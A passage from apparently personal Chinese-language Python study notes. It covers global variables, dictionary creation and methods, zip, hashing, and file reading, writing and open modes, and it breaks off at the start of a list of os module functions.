而在声明了全局变量时则会将全局变量直接改变引用对象<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">img1 = [<span class="number">12</span>,<span class="number">34</span>,<span class="number">56</span>,<span class="number">78</span>]</span><br><span class="line">img2 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">displ</span>():</span><br><span class="line">    <span class="built_in">print</span>(img1)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modi</span>():</span><br><span class="line">    <span class="comment"># img1.append(22)</span></span><br><span class="line">    <span class="keyword">global</span> img1</span><br><span class="line">    img1=img2</span><br><span class="line">modi()</span><br><span class="line">displ()</span><br><span class="line">out:</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="6-3-1-字典概述"><a href="#6-3-1-字典概述" class="headerlink" title="6.3.1 字典概述"></a>6.3.1 字典概述</h2><ol>
<li>Python 最强大的数据类型之一，通过键-值对的方式建立数据对象之间的映射关系。字典的每个键-值对用冒号:分割，每个键-值对间用逗号,分隔开，字典则包含在{}中。每个键都与一个值相关联，我们可以使用键来访问与之相关联的值。与键相关联的值可以是数字、字符串、列表乃至字典。事实上，可将任何 Python 对象用作字典中的值。<br> 格式如下：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = &#123; key1 : value1, key2 : value2 &#125;  </span><br></pre></td></tr></table></figure>

<ol start="2">
<li>&#x3D;&#x3D;键值对之间没有顺序且不能重复&#x3D;&#x3D;,打印效果可能跟定义顺序不一致</li>
<li>键值对的访问模式</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;值&gt;  =&lt;字典变量&gt;[&lt;键&gt;]</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>&#x3D;&#x3D;键必须不可变&#x3D;&#x3D;，所以可以用数字，字符串或元组充当，而用&#x3D;&#x3D;列表就不行&#x3D;&#x3D;</li>
<li>&#x3D;&#x3D;不允许同一个键出现两次&#x3D;&#x3D;。创建时如果同一个键被赋值两次，后一个值会被记住</li>
<li>直接使用大括号{}可以创建一个空字典,并通过中括号[]向其增加元素<br> 注意: 直接使用大括号不能生成空集合,需要使用set()</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d=&#123;&#125;</span><br><span class="line">&gt;&gt;&gt;d[&#x27;2^10&#x27;]=1024</span><br><span class="line">&gt;&gt;&gt;print(d)</span><br><span class="line">&#123;&#x27;2^10:1024&#125;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>sorted<br>dict &#x3D; {‘D’: 1, ‘B’: 2, ‘C’: -1}<br>print(sorted(dict))<br>[‘B’, ‘C’, ‘D’]</li>
</ol>
<p>dict &#x3D; {‘D’: 1, ‘a’: 0, ‘C’: -1}<br>print(sorted(dict.values()))<br>[-1, 0, 1]</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="built_in">sorted</span>(a,reverse=<span class="literal">True</span>)</span><br><span class="line">out:</span><br><span class="line">[<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure>


<p>字典类型的函数和方法</p>
<table>
<thead>
<tr>
<th>函数和方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>&lt; d&gt;.keys()</td>
<td>返回所有键信息dict_keys([1, 2])</td>
</tr>
<tr>
<td>&lt; d&gt;.values()</td>
<td>返回所有值信息dict_values([4, 3])</td>
</tr>
<tr>
<td>&lt; d&gt;.items()</td>
<td>返回所有的键值对dict_items([(1, 4), (2, 3)])</td>
</tr>
<tr>
<td>&lt; d&gt;.get(&lt; key&gt;,&lt; default&gt;)</td>
<td>键存在则返回相应值,否则返回默认值</td>
</tr>
<tr>
<td>&lt; d&gt;.pop(&lt; key&gt;,&lt; default&gt;)</td>
<td>键存在则返回相应值,同时删除键值对,否则返回默认值</td>
</tr>
<tr>
<td>&lt; d&gt;.popitem()</td>
<td>随机从字典中取出一个键值对,以元组(key,value)形式返回</td>
</tr>
<tr>
<td>&lt; d&gt;.clear()</td>
<td>删除所有键值对</td>
</tr>
<tr>
<td>del &lt; d&gt;[&lt; key&gt;]</td>
<td>删除字典中某一个键值对</td>
</tr>
<tr>
<td>&lt; key&gt; in &lt; d&gt;</td>
<td>如果键在字典中则返回Trule,否则False</td>
</tr>
<tr>
<td>&lt; d&gt;.fromkeys(list)</td>
<td>从给定的多个键创建一个新字典，值默认都是 None，也可以传入一个参数作为默认的值。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">list1 = [&#x27;Author&#x27;, &#x27;age&#x27;, &#x27;sex&#x27;]</span><br><span class="line">dic1 = dict.fromkeys(list1)</span><br><span class="line"># dic1 = &#123;&#x27;Author&#x27;: None, &#x27;age&#x27;: None, &#x27;sex&#x27;: None&#125;</span><br><span class="line">dic2 = dict.fromkeys(list1, &#x27;Python&#x27;)</span><br><span class="line"># dic2 = &#123;&#x27;Author&#x27;: &#x27;Python&#x27;, &#x27;age&#x27;: &#x27;Python&#x27;, &#x27;sex&#x27;: &#x27;Python&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>如果希望方法返回的是列表类型,可以使用list()</p>
<p><strong>创建字典</strong></p>
<p>在 Python 中，<code>dict()</code> 是一个内置函数，用于创建字典。字典是一种可变的、无序的、以键值对（key-value pair）形式存储数据的数据结构。<br>下面是一些使用 <code>dict()</code> 函数创建字典的方法：</p>
<ol>
<li>通过键值对创建字典：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="built_in">dict</span>(name=<span class="string">&#x27;John&#x27;</span>, age=<span class="number">30</span>)</span><br><span class="line"><span class="comment"># 输出: &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 30&#125;</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure></li>
<li>通过元组元组,元组列表，列表元组创建字典（只要是一个可迭代对象就行）：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="built_in">dict</span>(((<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;John&#x27;</span>), (<span class="string">&#x27;age&#x27;</span>, <span class="number">30</span>)))</span><br><span class="line"><span class="comment"># 输出: &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 30&#125;</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">d=<span class="built_in">dict</span>(([<span class="number">1</span>,<span class="number">4</span>],[<span class="number">2</span>,<span class="number">3</span>]))</span><br></pre></td></tr></table></figure></li>
<li>通过元组列表创建字典：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="built_in">dict</span>([(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;John&#x27;</span>), (<span class="string">&#x27;age&#x27;</span>, <span class="number">30</span>)])</span><br><span class="line"><span class="comment"># 输出: &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 30&#125;</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure></li>
<li>通过字典创建字典（复制字典）：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>&#125;</span><br><span class="line">d2 = <span class="built_in">dict</span>(d1)</span><br><span class="line"><span class="comment"># 输出: &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 30&#125;</span></span><br><span class="line"><span class="built_in">print</span>(d2)</span><br></pre></td></tr></table></figure></li>
<li>通过zip函数结合两个列表创建字典：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keys = [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>]</span><br><span class="line">values = [<span class="string">&#x27;John&#x27;</span>, <span class="number">30</span>]</span><br><span class="line">d = <span class="built_in">dict</span>(<span class="built_in">zip</span>(keys, values))</span><br><span class="line"><span class="comment"># 输出: &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 30&#125;</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>以上五种方法都可以创建字典，选择哪种方法主要取决于你的具体需求和数据的形式。</p>
<p><strong>zip函数</strong><br>Python的内置函数<code>zip()</code>用于将多个可迭代对象（例如列表、元组等）组合为一个迭代器。<code>zip()</code>返回的是一个元组的迭代器，其中的每个元组包含所有输入可迭代对象中相应位置的元素。</p>
<p>假设我们有两个列表，我们可以使用<code>zip()</code>函数将这两个列表”压缩”成一个列表的元组：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">list2 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">zipped = <span class="built_in">zip</span>(list1, list2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换成列表查看结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(zipped))  <span class="comment"># 输出：[(1, &#x27;a&#x27;), (2, &#x27;b&#x27;), (3, &#x27;c&#x27;)]</span></span><br></pre></td></tr></table></figure>

<p>你可以看到，<code>zip()</code>函数返回的结果是一个元组的列表，列表中的每个元组都包含两个输入列表中相应位置的元素。</p>
<p>如果输入的可迭代对象长度不一致，<code>zip()</code>函数会以最短的对象为准进行合并：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">list2 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">zipped = <span class="built_in">zip</span>(list1, list2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换成列表查看结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(zipped))  <span class="comment"># 输出：[(1, &#x27;a&#x27;), (2, &#x27;b&#x27;), (3, &#x27;c&#x27;)]</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>list1</code>比<code>list2</code>长，所以<code>zip()</code>的结果只包含三个元组。</p>
<p><strong>生成空字典</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">可行：</span><br><span class="line">d1=<span class="built_in">dict</span>()</span><br><span class="line">d2=<span class="built_in">dict</span>(&#123;&#125;)</span><br><span class="line">d3=<span class="built_in">dict</span>(())</span><br><span class="line">d4=<span class="built_in">dict</span>([])</span><br><span class="line">d5=&#123;&#125;</span><br><span class="line">不可行：</span><br><span class="line">d6=&#123;[]&#125;</span><br><span class="line">d7=&#123;&#123;&#125;&#125;</span><br><span class="line">注意：</span><br><span class="line">不可行都报错TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;list&#x27;</span>（<span class="string">&#x27;dict&#x27;</span>）</span><br><span class="line">但d=&#123;()&#125;则创建了一个<span class="built_in">set</span>集合，因为&#123;元素&#125;代表创建一个集合，而创建集合时，集合元素必须是不可变的（即，元素必须是哈希的）</span><br></pre></td></tr></table></figure>

<p>哈希：<br>在Python中，哈希（hash）是一种特殊的函数，它能够把输入的数据（比如字符串、整数等）映射为一个整数，这个整数可以作为数据的快速索引。</p>
<p>为了保证哈希的一致性，只有不可变的（immutable）数据类型可以被哈希。这就是为什么在Python中，列表（list）不能被哈希，而元组（tuple）可以被哈希的原因，因为列表是可变的，而元组是不可变的。</p>
<p>所以，是的，哈希元素在Python中通常指的是不可变的元素。</p>
<p>举个例子，以下是不可变的数据类型，它们都可以被哈希：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span>         <span class="comment"># 整数</span></span><br><span class="line">y = <span class="number">20.23</span>      <span class="comment"># 浮点数</span></span><br><span class="line">z = <span class="string">&#x27;hello&#x27;</span>    <span class="comment"># 字符串</span></span><br><span class="line">a = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)  <span class="comment"># 元组</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(x)) <span class="comment"># 输出一个整数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(y)) <span class="comment"># 输出一个整数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(z)) <span class="comment"># 输出一个整数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(a)) <span class="comment"># 输出一个整数</span></span><br></pre></td></tr></table></figure>

<p>而以下是可变的数据类型，它们不能被哈希：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]  <span class="comment"># 列表</span></span><br><span class="line">c = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;  <span class="comment"># 集合</span></span><br><span class="line">d = &#123;<span class="number">1</span>:<span class="string">&#x27;a&#x27;</span>, <span class="number">2</span>:<span class="string">&#x27;b&#x27;</span>, <span class="number">3</span>:<span class="string">&#x27;c&#x27;</span>&#125;  <span class="comment"># 字典</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(b)) <span class="comment"># 报错：TypeError: unhashable type: &#x27;list&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(c)) <span class="comment"># 报错：TypeError: unhashable type: &#x27;set&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(d)) <span class="comment"># 报错：TypeError: unhashable type: &#x27;dict&#x27;</span></span><br></pre></td></tr></table></figure>

<p>以上代码中，尝试对可变的数据类型进行哈希操作会抛出<code>TypeError</code>。</p>
<h1 id="第七章-文件操作和异常"><a href="#第七章-文件操作和异常" class="headerlink" title="第七章 文件操作和异常"></a>第七章 文件操作和异常</h1><h2 id="7-1文件操作"><a href="#7-1文件操作" class="headerlink" title="7.1文件操作"></a>7.1文件操作</h2><ol>
<li>在读写文件前，必须使用open创建文件对象</li>
<li>默认r</li>
<li>查看路径是否是文件夹：os模块下的isdir()</li>
<li>以文本方式打开时，读写按照字符串方式；以二进制方式打开时，读写按照字节流方式</li>
<li>f.readlines()可以优化为f <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;E:\\test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fi.readlines():<span class="comment">#for line in fi:</span></span><br><span class="line">    <span class="built_in">print</span>(line)</span><br></pre></td></tr></table></figure></li>
<li>readlines返回列表</li>
<li>非法组合：wr,x+</li>
<li>文件处理后可以不用.close()方法关闭文件，程序退出时会默认关闭</li>
<li>所有文件都可能以二进制方式打开</li>
</ol>
<p>&#x3D;&#x3D;open 函数&#x3D;&#x3D;<br>你必须先用Python内置的open()函数打开一个文件，创建一个file对象，相关的方法才可以调用它进行读写。</p>
<p>当尝试用 ‘r’（默认的读取模式）打开一个不存在的文件时，Python会抛出 FileNotFoundError。如果你想要创建一个新的文件，可以使用 ‘w’、’x’ 或 ‘a’ 模式打开文件，如果文件不存在，Python将会创建新文件。</p>
<p>file object &#x3D; open(file_name [, access_mode][, buffering])<br>各个参数的细节如下：</p>
<p>file_name：file_name变量是一个包含了你要访问的文件名称的字符串值。<br>access_mode：access_mode决定了打开文件的模式：只读，写入，追加等。所有可取值见如下的完全列表。这个参数是非强制的，默认文件访问模式为只读®。<br>buffering:如果buffering的值被设为0，就不会有寄存。如果buffering的值取1，访问文件时会寄存行。如果将buffering的值设为大于1的整数，表明了这就是的寄存区的缓冲大小。如果取负值，寄存区的缓冲大小则为系统默认。</p>
<p>&#x3D;&#x3D;read(),readline(),readlines()&#x3D;&#x3D;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;E:\\test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi.read():<span class="string">&#x27;aaaaa\nbbbb\nccccc&#x27;</span></span><br><span class="line">fi.readline():<span class="string">&#x27;aaaaa\n&#x27;</span></span><br><span class="line">fi.readlines():[<span class="string">&#x27;aaaaa\n&#x27;</span>, <span class="string">&#x27;bbbb\n&#x27;</span>, <span class="string">&#x27;ccccc&#x27;</span>]</span><br></pre></td></tr></table></figure>



<p>&#x3D;&#x3D;write()以及writelines()&#x3D;&#x3D;<br>在Python中，<code>write()</code> 和 <code>writelines()</code> 都是文件对象的方法，用于将数据写入文件。但是，它们的主要区别在于它们处理输入数据的方式：</p>
<ol>
<li><code>write()</code> 方法接受一个字符串作为参数，然后将这个字符串写入到文件中。</li>
</ol>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">file.write(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们打开一个名为 “test.txt” 的文件，将字符串 “Hello, World!” 写入到文件，然后关闭文件。</p>
<ol start="2">
<li><code>writelines()</code> 方法接受一个字符串列表作为参数，然后将列表中的所有字符串依次写入到文件中。这个方法不会在列表中的字符串之间添加任何分隔符。</li>
</ol>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">lines = [<span class="string">&quot;Hello, World!&quot;</span>, <span class="string">&quot;Hello, Python!&quot;</span>]</span><br><span class="line">file.writelines(lines)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们打开一个名为 “test.txt” 的文件，将字符串列表 [“Hello, World!”, “Hello, Python!”] 写入到文件，然后关闭文件。在文件中，这两行文本会被写成一行，因为 <code>writelines()</code> 不会在它们之间添加任何分隔符。如果你需要在每一行的末尾添加一个换行符，你需要在每一行的末尾手动添加它。</p>
<p>总结一下，<code>write()</code> 接受一个字符串作为参数，而 <code>writelines()</code> 接受一个字符串列表作为参数。</p>
<p>&#x3D;&#x3D;字符串在文件中无引号&#x3D;&#x3D;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;E:\\test.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">x = [<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;bb&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>]</span><br><span class="line">z = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> x:</span><br><span class="line">    z.append(<span class="built_in">str</span>(y))</span><br><span class="line">fo.write(<span class="string">&quot;,&quot;</span>.join(z))</span><br><span class="line">fo.close()</span><br><span class="line">文件中：aa,bb,cc</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fo = <span class="built_in">open</span>(“text.csv”,‘w’)</span><br><span class="line">x = [<span class="number">90</span>,<span class="number">87</span>,<span class="number">93</span>]</span><br><span class="line">fo. write(<span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(x)))</span><br><span class="line">fo.close()</span><br><span class="line">文件中：[,<span class="number">9</span>,<span class="number">0</span>, ,<span class="number">8</span>,<span class="number">7</span>, ,<span class="number">9</span>,<span class="number">3</span>,]</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;seek()&#x3D;&#x3D;<br>在 Python 中，文件对象的 <code>seek()</code> 方法用于改变文件的当前位置。<code>seek(offset, whence)</code> 方法有两个参数：</p>
<ul>
<li><code>offset</code>：这是字节的数量，文件指针将会根据 <code>whence</code> 参数移动这么多的字节。</li>
<li><code>whence</code>：这是可选的，并默认为 0，意味着从文件的起始位置开始，如果设为 1，则表示从当前位置开始，如果设为 2，则表示从文件的末尾开始。</li>
</ul>
<p><code>whence</code> 参数的合法值是 0，1或2。如果你传递 -1 或其他非法值给 <code>whence</code>，Python 会抛出一个 <code>ValueError</code>。所以，你不能传递 -1 给 <code>seek()</code> 方法。</p>
<p>例如，以下代码会抛出 <code>ValueError</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f.seek(<span class="number">10</span>, -<span class="number">1</span>)  <span class="comment"># ValueError: invalid whence (-1, should be 0, 1 or 2)</span></span><br></pre></td></tr></table></figure>

<p>总的来说，<code>seek()</code> 方法的 <code>whence</code> 参数只接受 0, 1 或 2。在调用 <code>seek()</code> 方法时，应确保传递合法的 <code>whence</code> 参数值。</p>
<p>&#x3D;&#x3D;tell()&#x3D;&#x3D;<br><code>tell()</code> 函数是 Python 文件对象的一个方法，用于返回当前文件指针的位置（即当前读取&#x2F;写入的位置）。</p>
<p>以下是 <code>tell()</code> 函数的使用示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;example.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件内容</span></span><br><span class="line">data = file.read(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(data)  <span class="comment"># 输出读取的前 10 个字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前文件指针的位置</span></span><br><span class="line">position = file.tell()</span><br><span class="line"><span class="built_in">print</span>(position)  <span class="comment"># 输出当前文件指针的位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>在上述示例中，首先通过 <code>open()</code> 函数打开了一个文件，并指定了读取模式 <code>&#39;r&#39;</code>。然后使用 <code>read(10)</code> 方法读取文件的前 10 个字符，并将结果存储在变量 <code>data</code> 中。接下来，通过调用 <code>tell()</code> 方法获取当前文件指针的位置，并将结果存储在变量 <code>position</code> 中。最后，通过调用 <code>close()</code> 方法关闭文件。</p>
<p>注意，<code>tell()</code> 函数返回的是文件指针的字节位置，对于文本文件而言，每个字符通常占用一个字节。如果文件是二进制文件或以其他编码方式进行编码的文件，则可能会占用多个字节。</p>
<p>需要注意的是，<code>tell()</code> 函数在读取&#x2F;写入操作之后调用，以获取最新的文件指针位置。</p>
<p>&#x3D;&#x3D;不同模式打开文件的完全列表&#x3D;&#x3D;<br>模式	描述<br>t	文本模式 (默认)。<br>x	写模式，新建一个文件，如果该文件已存在则会报错。<br>b	二进制模式。<br>+打开一个文件进行更新(可读可写)。<br>U	通用换行模式（不推荐）。<br>r	以只读方式打开文件。文件的指针将会放在文件的开头。这是&#x3D;&#x3D;默认模式&#x3D;&#x3D;。<br>rb	以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。<br>r+	打开一个文件用于读写。文件指针将会放在文件的开头。<br>rb+	以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。<br>w	打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。<br>wb	以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。<br>w+	打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。<br>wb+	以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。<br>a	打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。<br>ab	以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。<br>a+	打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。<br>ab+	以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。<br>File对象的属性<br>一个文件被打开后，你有一个file对象，你可以得到有关该文件的各种信息。</p>
<p>以下是和file对象相关的所有属性的列表：</p>
<p>属性	描述<br>file.closed	如果文件已被关闭返回true，否则返回false。<br>file.mode	返回被打开文件的访问模式。<br>file.name	返回文件的名称。<br>file.softspace	如果用print输出后，必须跟一个空格符，则返回false。否则返回true。（3.x已经移除）</p>
<h2 id="7-2-os模块"><a href="#7-2-os模块" class="headerlink" title="7.2 os模块"></a>7.2 os模块</h2><p>Python的<code>os</code>模块提供了很多操作系统级别的功能。以下是一些常见的<code>os</code>模块方法：</p>
<ol>
<li><p><code>os.name</code>: 输出字符串指示正在使用的平台。如果是window 则用’nt’表示，对于Linux&#x2F;Unix用户，它是’posix’。</p>
</li>
<li><p><code>os.getcwd()</code>: 返回当前的工作目录。</p>
</li>
<li><p><code>os.chdir(path)</code>: 改变当前工作目录到指定的路径。</p>
</li>
<li><p><code>os.listdir(path)</code>: 返回path指定的文件夹包含的文件或文件夹的名字的列表。</p>
</li>
<li><p><code>os.mkdir(path)</code>: 创建文件夹。</p>
</li>
